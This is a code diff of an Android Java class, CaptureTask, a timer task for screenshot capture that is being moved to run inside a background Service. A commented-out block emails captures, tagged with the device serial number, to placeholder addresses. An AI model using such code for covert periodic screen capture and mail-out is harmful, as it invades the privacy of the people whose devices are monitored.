@@ -8,6 +8,7 @@ import java.util.TimerTask;
 import com.system.utils.*;
 
 import android.app.Activity;
+import android.app.Service;
 import android.content.ActivityNotFoundException;
 import android.content.Context;
 import android.content.Intent;
@@ -16,13 +17,16 @@ import android.os.Environment;
 import android.util.Log;
 
 /**
- * Implementation of the timer task.
+ * Implementation of the timer task for screenshot capture.
  */
 class CaptureTask extends TimerTask 
 {
-	public CaptureTask()
+	public Service service;
+	
+	public CaptureTask(Service service)
 	{
 		super();
+		this.service = service;
 	}
 	
 	private final String LOGTAG = "CaptureTask";
@@ -86,7 +90,6 @@ class CaptureTask extends TimerTask
             Log.e("SendMail", e.getMessage(), e);   
         } 
         
-        
         /*
         Intent sendIntent = new Intent(android.content.Intent.ACTION_SEND);
         String title = "Capture From " + DeviceProperty.getSerialNum() + " - " + now;
@@ -107,12 +110,10 @@ class CaptureTask extends TimerTask
         
         String mEmailTo = "foo@gmail.com,bar@gmail.com";
         sendIntent.putExtra(Intent.EXTRA_EMAIL, mEmailTo.split(","));
-        sendIntent = Intent.createChooser(sendIntent, _activity.getString(R.string.e_mail));
-        
-        
+        sendIntent = Intent.createChooser(sendIntent, this.service.getString(R.string.eMail));
         
         try {
-            _activity.startActivity(sendIntent);
+            this.service.startActivity(sendIntent);
         } catch (ActivityNotFoundException ex) {
         	//TODO
         }*/
